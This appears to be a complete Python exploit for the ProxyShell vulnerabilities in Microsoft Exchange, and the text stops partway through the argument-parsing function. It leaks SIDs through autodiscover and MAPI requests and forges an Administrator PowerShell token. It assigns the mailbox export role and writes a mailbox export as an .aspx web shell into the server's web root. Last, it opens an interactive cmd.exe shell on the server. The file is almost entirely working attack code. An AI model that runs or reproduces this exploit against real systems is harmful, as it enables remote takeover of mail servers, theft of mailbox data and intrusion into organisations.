#!/usr/bin/env python3
#
# https://github.com/horizon3ai/proxyshell
# Improved version of https://github.com/dmaasland/proxyshell-poc

import argparse
import base64
import struct
import random
import string
import re
import requests
import threading
import shlex
import sys
import time
import tldextract
import xml.etree.ElementTree as ET

from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool
from pypsrp.complex_objects import Command
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
from functools import partial

TARGET = None

EXCHANGE_MAP = {
    '15.0.1497.23' : {'long_version': 'Exchange Server 2013 CU23 Jul21SU', 'version_short': 'Exchange2013'},
    '15.0.1497.18' : {'long_version': 'Exchange Server 2013 CU23 May21SU', 'version_short': 'Exchange2013'},
    '15.0.1497.15' : {'long_version': 'Exchange Server 2013 CU23 Apr21SU', 'version_short': 'Exchange2013'},
    '15.0.1497.12' : {'long_version': 'Exchange Server 2013 CU23 Mar21SU', 'version_short': 'Exchange2013'},
    '15.0.1497.2' : {'long_version': 'Exchange Server 2013 CU23', 'version_short': 'Exchange2013'},
    '15.0.1473.6' : {'long_version': 'Exchange Server 2013 CU22 Mar21SU', 'version_short': 'Exchange2013'},
    '15.0.1473.3' : {'long_version': 'Exchange Server 2013 CU22', 'version_short': 'Exchange2013'},
    '15.0.1395.12' : {'long_version': 'Exchange Server 2013 CU21 Mar21SU', 'version_short': 'Exchange2013'},
    '15.0.1395.4' : {'long_version': 'Exchange Server 2013 CU21', 'version_short': 'Exchange2013'},
    '15.0.1367.3' : {'long_version': 'Exchange Server 2013 CU20', 'version_short': 'Exchange2013'},
    '15.0.1365.1' : {'long_version': 'Exchange Server 2013 CU19', 'version_short': 'Exchange2013'},
    '15.0.1347.2' : {'long_version': 'Exchange Server 2013 CU18', 'version_short': 'Exchange2013'},
    '15.0.1320.4' : {'long_version': 'Exchange Server 2013 CU17', 'version_short': 'Exchange2013'},
    '15.0.1293.2' : {'long_version': 'Exchange Server 2013 CU16', 'version_short': 'Exchange2013'},
    '15.0.1263.5' : {'long_version': 'Exchange Server 2013 CU15', 'version_short': 'Exchange2013'},
    '15.0.1236.3' : {'long_version': 'Exchange Server 2013 CU14', 'version_short': 'Exchange2013'},
    '15.0.1210.3' : {'long_version': 'Exchange Server 2013 CU13', 'version_short': 'Exchange2013'},
    '15.0.1178.4' : {'long_version': 'Exchange Server 2013 CU12', 'version_short': 'Exchange2013'},
    '15.0.1156.6' : {'long_version': 'Exchange Server 2013 CU11', 'version_short': 'Exchange2013'},
    '15.0.1130.7' : {'long_version': 'Exchange Server 2013 CU10', 'version_short': 'Exchange2013'},
    '15.0.1104.5' : {'long_version': 'Exchange Server 2013 CU9', 'version_short': 'Exchange2013'},
    '15.0.1076.9' : {'long_version': 'Exchange Server 2013 CU8', 'version_short': 'Exchange2013'},
    '15.0.1044.25' : {'long_version': 'Exchange Server 2013 CU7', 'version_short': 'Exchange2013'},
    '15.0.995.29' : {'long_version': 'Exchange Server 2013 CU6', 'version_short': 'Exchange2013'},
    '15.0.913.22' : {'long_version': 'Exchange Server 2013 CU5', 'version_short': 'Exchange2013'},
    '15.0.847.64' : {'long_version': 'Exchange Server 2013 SP1 Mar21SU', 'version_short': 'Exchange2013'},
    '15.0.847.32' : {'long_version': 'Exchange Server 2013 SP1', 'version_short': 'Exchange2013'},
    '15.0.775.38' : {'long_version': 'Exchange Server 2013 CU3', 'version_short': 'Exchange2013'},
    '15.0.712.24' : {'long_version': 'Exchange Server 2013 CU2', 'version_short': 'Exchange2013'},
    '15.0.620.29' : {'long_version': 'Exchange Server 2013 CU1', 'version_short': 'Exchange2013'},
    '15.0.516.32' : {'long_version': 'Exchange Server 2013 RTM', 'version_short': 'Exchange2013'},
    '15.1.2308.14' : {'long_version': 'Exchange Server 2016 CU21 Jul21SU', 'version_short': 'Exchange2016'},
    '15.1.2308.8' : {'long_version': 'Exchange Server 2016 CU21', 'version_short': 'Exchange2016'},
    '15.1.2242.12' : {'long_version': 'Exchange Server 2016 CU20 Jul21SU', 'version_short': 'Exchange2016'},
    '15.1.2242.10' : {'long_version': 'Exchange Server 2016 CU20 May21SU', 'version_short': 'Exchange2016'},
    '15.1.2242.8' : {'long_version': 'Exchange Server 2016 CU20 Apr21SU', 'version_short': 'Exchange2016'},
    '15.1.2242.4' : {'long_version': 'Exchange Server 2016 CU20', 'version_short': 'Exchange2016'},
    '15.1.2176.14' : {'long_version': 'Exchange Server 2016 CU19 May21SU', 'version_short': 'Exchange2016'},
    '15.1.2176.12' : {'long_version': 'Exchange Server 2016 CU19 Apr21SU', 'version_short': 'Exchange2016'},
    '15.1.2176.9' : {'long_version': 'Exchange Server 2016 CU19 Mar21SU', 'version_short': 'Exchange2016'},
    '15.1.2176.2' : {'long_version': 'Exchange Server 2016 CU19', 'version_short': 'Exchange2016'},
    '15.1.2106.13' : {'long_version': 'Exchange Server 2016 CU18 Mar21SU', 'version_short': 'Exchange2016'},
    '15.1.2106.2' : {'long_version': 'Exchange Server 2016 CU18', 'version_short': 'Exchange2016'},
    '15.1.2044.13' : {'long_version': 'Exchange Server 2016 CU17 Mar21SU', 'version_short': 'Exchange2016'},
    '15.1.2044.4' : {'long_version': 'Exchange Server 2016 CU17', 'version_short': 'Exchange2016'},
    '15.1.1979.8' : {'long_version': 'Exchange Server 2016 CU16 Mar21SU', 'version_short': 'Exchange2016'},
    '15.1.1979.3' : {'long_version': 'Exchange Server 2016 CU16', 'version_short': 'Exchange2016'},
    '15.1.1913.12' : {'long_version': 'Exchange Server 2016 CU15 Mar21SU', 'version_short': 'Exchange2016'},
    '15.1.1913.5' : {'long_version': 'Exchange Server 2016 CU15', 'version_short': 'Exchange2016'},
    '15.1.1847.12' : {'long_version': 'Exchange Server 2016 CU14 Mar21SU', 'version_short': 'Exchange2016'},
    '15.1.1847.3' : {'long_version': 'Exchange Server 2016 CU14', 'version_short': 'Exchange2016'},
    '15.1.1779.8' : {'long_version': 'Exchange Server 2016 CU13 Mar21SU', 'version_short': 'Exchange2016'},
    '15.1.1779.2' : {'long_version': 'Exchange Server 2016 CU13', 'version_short': 'Exchange2016'},
    '15.1.1713.10' : {'long_version': 'Exchange Server 2016 CU12 Mar21SU', 'version_short': 'Exchange2016'},
    '15.1.1713.5' : {'long_version': 'Exchange Server 2016 CU12', 'version_short': 'Exchange2016'},
    '15.1.1591.18' : {'long_version': 'Exchange Server 2016 CU11 Mar21SU', 'version_short': 'Exchange2016'},
    '15.1.1591.10' : {'long_version': 'Exchange Server 2016 CU11', 'version_short': 'Exchange2016'},
    '15.1.1531.12' : {'long_version': 'Exchange Server 2016 CU10 Mar21SU', 'version_short': 'Exchange2016'},
    '15.1.1531.3' : {'long_version': 'Exchange Server 2016 CU10', 'version_short': 'Exchange2016'},
    '15.1.1466.16' : {'long_version': 'Exchange Server 2016 CU9 Mar21SU', 'version_short': 'Exchange2016'},
    '15.1.1466.3' : {'long_version': 'Exchange Server 2016 CU9', 'version_short': 'Exchange2016'},
    '15.1.1415.10' : {'long_version': 'Exchange Server 2016 CU8 Mar21SU', 'version_short': 'Exchange2016'},
    '15.1.1415.2' : {'long_version': 'Exchange Server 2016 CU8', 'version_short': 'Exchange2016'},
    '15.1.1261.35' : {'long_version': 'Exchange Server 2016 CU7', 'version_short': 'Exchange2016'},
    '15.1.1034.26' : {'long_version': 'Exchange Server 2016 CU6', 'version_short': 'Exchange2016'},
    '15.1.845.34' : {'long_version': 'Exchange Server 2016 CU5', 'version_short': 'Exchange2016'},
    '15.1.669.32' : {'long_version': 'Exchange Server 2016 CU4', 'version_short': 'Exchange2016'},
    '15.1.544.27' : {'long_version': 'Exchange Server 2016 CU3', 'version_short': 'Exchange2016'},
    '15.1.466.34' : {'long_version': 'Exchange Server 2016 CU2', 'version_short': 'Exchange2016'},
    '15.1.396.30' : {'long_version': 'Exchange Server 2016 CU1', 'version_short': 'Exchange2016'},
    '15.1.225.42' : {'long_version': 'Exchange Server 2016 RTM', 'version_short': 'Exchange2016'},
    '15.1.225.16' : {'long_version': 'Exchange Server 2016 Preview', 'version_short': 'Exchange2016'},
    '15.2.922.13' : {'long_version': 'Exchange Server 2019 CU10 Jul21SU', 'version_short': 'Exchange2019'},
    '15.2.922.7' : {'long_version': 'Exchange Server 2019 CU10', 'version_short': 'Exchange2019'},
    '15.2.858.15' : {'long_version': 'Exchange Server 2019 CU9 Jul21SU', 'version_short': 'Exchange2019'},
    '15.2.858.12' : {'long_version': 'Exchange Server 2019 CU9 May21SU', 'version_short': 'Exchange2019'},
    '15.2.858.10' : {'long_version': 'Exchange Server 2019 CU9 Apr21SU', 'version_short': 'Exchange2019'},
    '15.2.858.5' : {'long_version': 'Exchange Server 2019 CU9', 'version_short': 'Exchange2019'},
    '15.2.792.15' : {'long_version': 'Exchange Server 2019 CU8 May21SU', 'version_short': 'Exchange2019'},
    '15.2.792.13' : {'long_version': 'Exchange Server 2019 CU8 Apr21SU', 'version_short': 'Exchange2019'},
    '15.2.792.10' : {'long_version': 'Exchange Server 2019 CU8 Mar21SU', 'version_short': 'Exchange2019'},
    '15.2.792.3' : {'long_version': 'Exchange Server 2019 CU8', 'version_short': 'Exchange2019'},
    '15.2.721.13' : {'long_version': 'Exchange Server 2019 CU7 Mar21SU', 'version_short': 'Exchange2019'},
    '15.2.721.2' : {'long_version': 'Exchange Server 2019 CU7', 'version_short': 'Exchange2019'},
    '15.2.659.12' : {'long_version': 'Exchange Server 2019 CU6 Mar21SU', 'version_short': 'Exchange2019'},
    '15.2.659.4' : {'long_version': 'Exchange Server 2019 CU6', 'version_short': 'Exchange2019'},
    '15.2.595.8' : {'long_version': 'Exchange Server 2019 CU5 Mar21SU', 'version_short': 'Exchange2019'},
    '15.2.595.3' : {'long_version': 'Exchange Server 2019 CU5', 'version_short': 'Exchange2019'},
    '15.2.529.13' : {'long_version': 'Exchange Server 2019 CU4 Mar21SU', 'version_short': 'Exchange2019'},
    '15.2.529.5' : {'long_version': 'Exchange Server 2019 CU4', 'version_short': 'Exchange2019'},
    '15.2.464.15' : {'long_version': 'Exchange Server 2019 CU3 Mar21SU', 'version_short': 'Exchange2019'},
    '15.2.464.5' : {'long_version': 'Exchange Server 2019 CU3', 'version_short': 'Exchange2019'},
    '15.2.397.11' : {'long_version': 'Exchange Server 2019 CU2 Mar21SU', 'version_short': 'Exchange2019'},
    '15.2.397.3' : {'long_version': 'Exchange Server 2019 CU2', 'version_short': 'Exchange2019'},
    '15.2.330.11' : {'long_version': 'Exchange Server 2019 CU1 Mar21SU', 'version_short': 'Exchange2019'},
    '15.2.330.5' : {'long_version': 'Exchange Server 2019 CU1', 'version_short': 'Exchange2019'},
    '15.2.221.18' : {'long_version': 'Exchange Server 2019 RTM Mar21SU', 'version_short': 'Exchange2019'},
    '15.2.221.12' : {'long_version': 'Exchange Server 2019 RTM', 'version_short': 'Exchange2019'},
    '15.2.196.0' : {'long_version': 'Exchange Server 2019 Preview', 'version_short': 'Exchange2019'}
}
EXCHANGE_ALT_MAP = {
    '15.0': {'long_version': 'Exchange Server 2013', 'version_short': 'Exchange2013'},
    '15.1': {'long_version': 'Exchange Server 2016', 'version_short': 'Exchange2016'},
    '15.2': {'long_version': 'Exchange Server 2019', 'version_short': 'Exchange2019'}
}

BUILTIN_EMAILS = [
    'Administrator',
    'SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}',
    'DiscoverySearchMailbox{D919BA05-46A6-415f-80AD-7E09334BB852}'
    'FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042',
    'Migration.8f3e7716-2011-43e4-96b1-aba62d229136',
    'SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}',
    'SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}',
    'SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA}'
]

class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """Handle requests in a separate thread."""


class PwnServer(BaseHTTPRequestHandler):
    def __init__(self, proxyshell, *args, **kwargs):
        self.proxyshell = proxyshell
        super().__init__(*args, **kwargs)

    def do_POST(self):
        global TARGET
        # From: https://y4y.space/2021/08/12/my-steps-of-reproducing-proxyshell/
        powershell_url = f'/powershell/?X-Rps-CAT={self.proxyshell.token}&PSVersion=5.1.17763.1971'
        length = int(self.headers['content-length'])
        content_type = self.headers['content-type']
        post_data = self.rfile.read(length).decode()
        if TARGET:
            post_data = re.sub('<wsa:To>(.*?)</wsa:To>', f'<wsa:To>http://{TARGET}:80/powershell</wsa:To>', post_data)
        post_data = re.sub('<wsman:ResourceURI s:mustUnderstand="true">(.*?)</wsman:ResourceURI>', '<wsman:ResourceURI>http://schemas.microsoft.com/powershell/Microsoft.Exchange</wsman:ResourceURI>', post_data)

        headers = {
            'Content-Type': content_type
        }

        backend = 'be'
        while TARGET != backend:
            r = self.proxyshell.post(powershell_url, post_data, headers)

            backend = r.headers.get('X-CalculatedBETarget')
            if r.status_code == 200 and b'ResourceCreated' in r.content:
                TARGET = r.headers.get('X-CalculatedBETarget')
                print(f'[+] Created powershell session on {TARGET}')
            elif r.status_code == 500 and TARGET != backend:
                print(f'[-] Load balanced to wrong server: {backend}')
            elif r.status_code == 500 and TARGET == backend and b'assigned to any management roles':
                print(f'[-] User has insufficient permissions')
                print(r.content)
                sys.exit()
            elif r.status_code == 500:
                print(r.status_code)
                print(r.headers)
                print(r.content)
            else:
                pass
                #print(r.status_code)
                #print(r.headers)
                #print(r.content)

        resp = r.content
        self.send_response(200)
        self.end_headers()
        self.wfile.write(resp)


class ProxyShell:

    def __init__(self, exchange_url, email, verify=False):

        self.email = None
        self.emails = []
        self.exchange_url = exchange_url if exchange_url.startswith('https://') else f'https://{exchange_url}'
        self.rand_email = f'{rand_string()}@{rand_string()}.{rand_string(3)}'
        self.sid = None
        self.legacydn = None
        self.legacydns = []
        self.rand_subj = rand_string(16)
        self.target_be = None
        self.servers = {}
        self.version = None
        self.versions = {'Exchange2016'}
        self.domain = None
        self.domains = set()

        self.session = requests.Session()
        self.session.verify = verify
        self.session.headers = {
            'Cookie': f'Email=autodiscover/autodiscover.json?a={self.rand_email}'
        }

    def post(self, endpoint, data, headers={}):

        url = f'{self.exchange_url}/autodiscover/autodiscover.json?a={self.rand_email}{endpoint}'
        r = self.session.post(
            url=url,
            data=data,
            headers=headers
        )
        return r

    def get(self, endpoint):
        url = f'{self.exchange_url}/autodiscover/autodiscover.json?a={self.rand_email}{endpoint}'
        headers = {
            'User-Agent': 'Mozilla/5.0',
            'Accept-Encoding': 'gzip, deflate',
            'X-Requested-With': 'XMLHttpRequest',
            'Accept' : '*/*',
            'Accept-Language': 'en-US,q=0.5,en',
            'Cookie': f'Email=autodiscover/autodiscover.json?a={self.rand_email}'
        }
        r = requests.get(url, headers=headers, verify=False)
        
        be_server = r.headers.get('X-Calculatedbetarget')
        version = re.search('<br>Version: (.*?)<br>', r.text)
        user = re.search('<b>User:<\/b>(.*?)<br>', r.text)
        sid = re.search('<b>SID:<\/b>(.*?)<br>', r.text)
        
        be_data = {}
        if be_server:
            # Add external domain as possible internal for builtin guesses
            try:
                extracted = tldextract.extract(be_server)
                domain = "{}.{}".format(extracted.domain, extracted.suffix)
                self.domains.add(domain)
            except:
                print(f'[-] Failed parsing external domains TLD')
                pass

            be_data[be_server] = {}
            if version:
                version = version.group(1).lstrip().rstrip()
                short_version = str(version[:4])
                be_data[be_server]['version'] = version
                if EXCHANGE_MAP.get(version):
                    be_data[be_server]['version_short'] = EXCHANGE_MAP.get(version)['long_version']
                    self.version = EXCHANGE_MAP.get(version)['version_short']
                    self.versions.add(self.version)
                elif EXCHANGE_ALT_MAP.get(short_version):
                    long_ver = EXCHANGE_ALT_MAP.get(short_version)['long_version']
                    short_ver = EXCHANGE_ALT_MAP.get(short_version)['version_short']
                    be_data[be_server]['version_short'] = long_ver
                    self.version = short_ver
                    self.versions.add(self.version)
                else:
                    print(f'[-] Exchange version {version} not in map')
            if user:
                user = user.group(1).lstrip().rstrip()
                be_data[be_server]['user'] = user
            if sid:
                sid = sid.group(1).lstrip().rstrip()
                be_data[be_server]['sid'] = sid

        return be_data

    def enumerate(self):
        # Request /map/nspi endpoint several times to determine BE servers and fixate future requests
        print('[+] Determining number of Exchange backend servers...')
        for i in range(20):
            data = self.get('/mapi/nspi')
            self.servers.update(data)

        print(f'[+] Exchange Backend Servers: {list(self.servers.keys())}') 
        for be, data in self.servers.items():
            for key, info in data.items():
                print(f'[+]     {be} - {key}: {info}')

        if not any(self.servers.values()):
            print('[-] Not vulnerable!')
            sys.exit()

    def get_sid_from_be(self):
        for be, data in self.servers.items():
            sid = data.get('sid')
            if sid:
                sid_length = len(sid.split('-'))
                if sid_length == 8:
                    print(f'[+] Successfully parsed SID via backend request: {sid}')
                    self.sid = sid
                    return sid

    def rid_cycle(self, rid=500):
        try:
            group_sid = '-'.join(self.sid.split('-')[:-1])
            new_sid = group_sid + '-' + str(rid)
            self.sid = new_sid
            print(f'[+] RID Cycled: {self.sid}')
        except:
            print(f'[-] Failed cycling SID: {self.sid}')
            sys.exit()

    def get_emails(self):
        if self.version:
            print(f'[+] Attempting to retrieve Active Directory emails...')
        else:
            print(f'[-] Failed enumerating Exchange version to request emails')
            return
        
        data = '''
            <soap:Envelope
                xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
                xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
                xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
                <soap:Header>
                    <t:RequestServerVersion Version="{}"/>
                </soap:Header>
                <soap:Body>
                    <m:ResolveNames ReturnFullContactData="true" SearchScope="ActiveDirectory">
                    <m:UnresolvedEntry>SMTP:</m:UnresolvedEntry>
                    </m:ResolveNames>
                </soap:Body>
            </soap:Envelope>
        '''
        
        headers = {
            'Content-Type': 'text/xml'
        }
        
        success = False
        while not success:
            version = random.choice(list(self.versions))
            data = data.format(version)
            
            r = self.post('/EWS/exchange.asmx', data=data, headers=headers)
            if 'ErrorInvalidServerVersion' not in r.text and 'The request is invalid' not in r.text:
                success = True

        try:
            email_xml = ET.fromstring(r.content)
            
            # Parse UserMailbox LegacyDNs
            mailboxes = email_xml.findall('{*}Body/{*}ResolveNamesResponse/{*}ResponseMessages/{*}ResolveNamesResponseMessage/{*}ResolutionSet/{*}Resolution/{*}Contact/{*}EmailAddresses/{*}Entry')
            for mailbox in mailboxes:
                if 'X500:' in mailbox.text or 'x500:' in mailbox.text:
                    legacydn = mailbox.text.split('500:')[1]
                    self.legacydns.append(legacydn)
            print(f'[+] Enumerated {len(self.legacydns)} possible UserMailbox LegacyDNs from Active Directory')

            # Parse User LegacyDNs
            emails = email_xml.findall('{*}Body/{*}ResolveNamesResponse/{*}ResponseMessages/{*}ResolveNamesResponseMessage/{*}ResolutionSet/{*}Resolution/{*}Mailbox/{*}EmailAddress')
            smtp_domains = {}
            for email in emails:
                self.emails.append(email.text)
                smtp_domain = email.text.split('@')[1]
                if isinstance(smtp_domains.get(smtp_domain), int):
                    smtp_domains[smtp_domain.lower()] += 1
                else:
                    smtp_domains[smtp_domain.lower()] = 0
            print(f'[+] Enumerated {len(self.emails)} possible User LegacyDNs from Active Directory')
            
            self.domains.update(list(smtp_domains))
            print(f'[+] Enumerated SMTP domains: {self.domains}')

        except:
            print(f'[-] Failed enumerating Active Directory emails')
            pass

    def get_token(self):
        self.token = self.gen_token()

    def get_sid_from_legacydn(self, legacydns=None):
        sid = None
        if not legacydns:
            legacydns = self.legacydns
        
        for legacydn in legacydns:
            print(f'[+]     Attempting to retrieve SID for {legacydn}')
            data = legacydn
            data += '\x00\x00\x00\x00\x00\xe4\x04'
            data += '\x00\x00\x09\x04\x00\x00\x09'
            data += '\x04\x00\x00\x00\x00\x00\x00'

            headers = {
                "X-Requesttype": 'Connect',
                "X-Clientinfo": '{2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226}',
                "X-Clientapplication": 'Outlook/15.0.4815.1002',
                "X-Requestid": '{C715155F-2BE8-44E0-BD34-2960067874C8}:2',
                'Content-Type': 'application/mapi-http'
            }

            r = self.post('/mapi/emsmdb', data, headers)

            try:
                # Parse valid user LegacyDN
                user_sid = r.text.split('with SID ')[1].split(' and MasterAccountSid')[0]
                if len(user_sid.split('-')) == 8:
                    self.sid = user_sid
                    sid = user_sid
                    print(f'[+]     Successfully parsed SID via UserMailbox object: {user_sid}')
                
                # Parse SID from requester of MailContact object
                user_sid = r.text.split('User SID: ')[1].split("' can't act as owner")[0]
                if len(user_sid.split('-')) == 8:
                    self.sid = user_sid
                    sid = user_sid
                    print(f'[+]     Successfully parsed SID via MailContact: {user_sid}')
            except:
                #print(f'Failed parsing SID from /mapi/emsmdb endpoint:\n{r.text}')
                pass

            if sid:
                break

        return sid

    def get_sid_from_builtin(self):
        sid = None

        print(f'[+] Attempting to discover SID via {len(BUILTIN_EMAILS) * len(self.domains)} builtin email combinations')
        for email in BUILTIN_EMAILS:
            if sid:
                break

            for domain in self.domains:
                data = self.autodiscover_body(email + '@' + domain)
                headers = {'Content-Type': 'text/xml'}
                r = self.post('/autodiscover/autodiscover.xml', data, headers)
            
                try:
                    # Attempt to parse LegacyDN if present
                    autodiscover_xml = ET.fromstring(r.content)
                    legacydn = autodiscover_xml.find('{*}Response/{*}User/{*}LegacyDN').text
                    print(f'[+]     Retrieved LegacyDN: {legacydn}')

                    # If LegacyDN present, this is the SMTP domain
                    if not self.domain:
                        self.domain = domain
                        self.domains = {domain}
                        print(f'[+]     Identified backend SMTP domain: {domain}')

                    # Attempt SID lookup inline before enumerating more LegacyDNs
                    sid = self.get_sid_from_legacydn([legacydn])
                    
                    break

                except Exception as e:
                    #print(f'Failed parsing LegacyDN from response:\n{e}')
                    continue

        if not self.domain:
            print(f'[-] Failed identifying backend SMTP domain')

        if not sid:
            print(f'[-] Failed finding SID via builtin emails')

        return sid


    def get_sid_from_email(self):
        sid = None

        if self.emails:
            print(f'[+] Attempting to discover SID via {len(self.emails)} enumerated emails')
        else:
            print(f'[-] No emails enumerated - skipping SID discovery via this method')
        
        for email in self.emails:
            data = self.autodiscover_body(email)
            headers = {'Content-Type': 'text/xml'}
            r = self.post('/autodiscover/autodiscover.xml', data, headers)
            
            try:
                # Attempt to parse LegacyDN if present
                autodiscover_xml = ET.fromstring(r.content)
                legacydn = autodiscover_xml.find('{*}Response/{*}User/{*}LegacyDN').text
                print(f'[+]     Retrieved LegacyDN: {legacydn}')

                # Attempt SID lookup inline before enumerating more LegacyDNs
                sid = self.get_sid_from_legacydn([legacydn])
                if sid:
                    break

            except Exception as e:
                #print(f'Failed parsing LegacyDN from response:\n{e}')
                continue
        
        if not sid:
            print(f'[-] Failed finding SID via user emails')

        return sid

    def autodiscover_body(self, email):

        autodiscover = ET.Element(
            'Autodiscover',
            xmlns='http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006'
        )

        request = ET.SubElement(autodiscover, 'Request')
        ET.SubElement(request, 'EMailAddress').text = email
        ET.SubElement(request, 'AcceptableResponseSchema').text = 'http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a'

        return ET.tostring(
            autodiscover,
            encoding='unicode',
            method='xml'
        )

    def gen_token(self):

        # From: https://y4y.space/2021/08/12/my-steps-of-reproducing-proxyshell/
        version = 0
        ttype = 'Windows'
        compressed = 0
        auth_type = 'Kerberos'
        raw_token = b''
        gsid = 'S-1-5-32-544'
        self.email = 'Administrator@' + self.domain
        version_data = b'V' + (1).to_bytes(1, 'little') + (version).to_bytes(1, 'little')
        type_data = b'T' + (len(ttype)).to_bytes(1, 'little') + ttype.encode()
        compress_data = b'C' + (compressed).to_bytes(1, 'little')
        auth_data = b'A' + (len(auth_type)).to_bytes(1, 'little') + auth_type.encode()
        login_data = b'L' + (len(self.email)).to_bytes(1, 'little') + self.email.encode()
        user_data = b'U' + (len(self.sid)).to_bytes(1, 'little') + self.sid.encode()
        group_data = b'G' + struct.pack('<II', 1, 7) + (len(gsid)).to_bytes(1, 'little') + gsid.encode()
        ext_data = b'E' + struct.pack('>I', 0)

        raw_token += version_data
        raw_token += type_data
        raw_token += compress_data
        raw_token += auth_data
        raw_token += login_data
        raw_token += user_data
        raw_token += group_data
        raw_token += ext_data

        data = base64.b64encode(raw_token).decode()
        print(f'[+] Generated token for {self.email} - {self.sid}')
        return data


def rand_string(n=5):

    return ''.join(random.choices(string.ascii_lowercase, k=n))


def exploit(proxyshell):
    # Request /mapi/nspi multiple times to determine backends and potentially leak SID
    proxyshell.enumerate()
    be_sid = proxyshell.get_sid_from_be()
    
    # Retrieve Active Directory email data
    proxyshell.get_emails()

    # Check if SID leaked via UserMailbox LegacyDNs
    mailbox_sid = proxyshell.get_sid_from_legacydn()

    # Check if SID leaked via common builtin emails and find SMTP domain
    builtin_sid = proxyshell.get_sid_from_builtin()

    # Check if SID leaked via enumerated AD emails
    user_sid = proxyshell.get_sid_from_email()
    
    if be_sid or mailbox_sid or builtin_sid or user_sid:
        proxyshell.rid_cycle()
        proxyshell.get_token()
        print(f'[+] Token: {proxyshell.token}')
    else:
        print(f'[-] Failed to obtain a SID via any method!')
        sys.exit()

def start_server(proxyshell, port):

    handler = partial(PwnServer, proxyshell)
    server = ThreadedHTTPServer(('', port), handler)
    server_thread = threading.Thread(target=server.serve_forever)
    server_thread.daemon = True
    server_thread.start()


def shell(command, port, proxyshell):
    # From: https://y4y.space/2021/08/12/my-steps-of-reproducing-proxyshell/
    if command.lower() in ['exit', 'quit']:
        exit()

    wsman = WSMan("127.0.0.1", username='', password='', ssl=False, port=port, auth='basic', encryption='never')
    with RunspacePool(wsman, configuration_name='Microsoft.Exchange') as pool:
        
        if command.lower().strip() == 'dropshell':
            
            email_success = False
            while not email_success:
                import time
                time.sleep(0.5)
                r = drop_shell(proxyshell)
                
                if 'The specified server version is invalid' in r.text:
                    print('Send email Exchange version mismatch in EWS request.')
                elif 'The request failed schema validation' in r.text:
                    print('Failed schema validation')
                    sys.exit()
                elif 'ErrorInvalid' in r.text:
                    print('Uknown error')
                    sys.exit()
                else:
                    email_success = True 
            
            print(f'[+] Attempting to lookup email for {proxyshell.sid}')
            ps = PowerShell(pool)
            ps.add_cmdlet('Get-User').add_parameter('Identity', proxyshell.sid).add_cmdlet('Select-Object').add_parameter('ExpandProperty', 'UserPrincipalName')
            output = ps.invoke()
            stdout = "\n".join([str(s) for s in output])
            stderr = "\n".join([str(s) for s in ps.streams.error])
            print("OUTPUT:\n%s" % stdout)
            print("ERROR:\n%s" % stderr)
            if stderr:
                sys.exit()
            else:
                proxyshell.email = stdout.rstrip().lstrip()
                print(f'[+] Successfully obtained email: {proxyshell.email}')


            print(f'[+] Attempting to assign export permission role to {proxyshell.email}')
            ps = PowerShell(pool)
            ps.add_cmdlet('New-ManagementRoleAssignment').add_parameter('Role', 'Mailbox Import Export').add_parameter('User', proxyshell.email)
            output = ps.invoke()
            stdout = "\n".join([str(s) for s in output])
            stderr = "\n".join([str(s) for s in ps.streams.error])
            print("OUTPUT:\n%s" % stdout)
            print("ERROR:\n%s" % stderr)
            if stderr:
                sys.exit()
            else:
                print(f'[+] Successfully assigned export permission role to {proxyshell.email}')
            
            print(f'[+] Attempting to export PST for {proxyshell.email} to C:\\inetpub\\wwwroot\\aspnet_client\\{proxyshell.rand_subj}.aspx')
            ps = PowerShell(pool)
            ps.add_cmdlet(
                'New-MailboxExportRequest'
            ).add_parameter(
                'Mailbox', proxyshell.email
            ).add_parameter(
                'FilePath', f'\\\\localhost\\c$\\inetpub\\wwwroot\\aspnet_client\\{proxyshell.rand_subj}.aspx'
            ).add_parameter(
                'IncludeFolders', '#Drafts#'
            ).add_parameter(
                'ContentFilter', f'Subject -eq \'{proxyshell.rand_subj}\''
            )
            output = ps.invoke()
            stdout = "\n".join([str(s) for s in output])
            stderr = "\n".join([str(s) for s in ps.streams.error])
            print("OUTPUT:\n%s" % stdout)
            print("ERROR:\n%s" % stderr)
            if stderr:
                sys.exit()
            else:
                print(f'[+] Successfully exported PST')


            shell_url = f'{proxyshell.exchange_url}/aspnet_client/{proxyshell.rand_subj}.aspx'
            print(f'Shell URL: {shell_url}')
            for i in range(10):
                print(f'Testing shell {i}')
                r = requests.get(shell_url, verify=proxyshell.session.verify)
                if r.status_code == 200:
                    delimit = rand_string()
                    
                    while True:
                        cmd = input('Shell> ')
                        if cmd.lower() in ['exit', 'quit']:
                            return

                        exec_code = f'Response.Write("{delimit}" + new ActiveXObject("WScript.Shell").Exec("cmd.exe /c {cmd}").StdOut.ReadAll() + "{delimit}");'
                        print(exec_code)
                        r = requests.get(
                            shell_url,
                            params={
                                'exec_code':exec_code
                            },
                            verify=proxyshell.session.verify
                        )
                        output = r.content.split(delimit.encode())[1]
                        print(output.decode())

                time.sleep(5)
                i += 1

            print('Shell drop failed :(')
            return
        else:
            ps = PowerShell(pool)
            cmd_array = shlex.split(command)

            # Cmdlet
            cmdlet = cmd_array[0]
            cmdlet = ps.add_cmdlet(cmdlet)

            # Parameters
            param_tuples = []
            param_pos = True
            param = ''
            for p in cmd_array[1:]:
                if param_pos:
                    param = p
                    param_pos = False
                else:
                    arg = p
                    param_tuples.append((param, arg))
                    param_pos = True
            
            for param in param_tuples:
                cmdlet.add_parameter(param[0][1:], param[1])
            
            output = ps.invoke()
            print('[+] PS> ' + command)
            print("OUTPUT:\n%s" % "\n".join([str(s) for s in output]))
            print("ERROR:\n%s" % "\n".join([str(s) for s in ps.streams.error]))


def get_args():
    parser = argparse.ArgumentParser(description='ProxyShell example')
    parser.add_argument('-u', help='Exchange URL', required=True)
    parser.add_argument('-e', help='Email address', required=False)
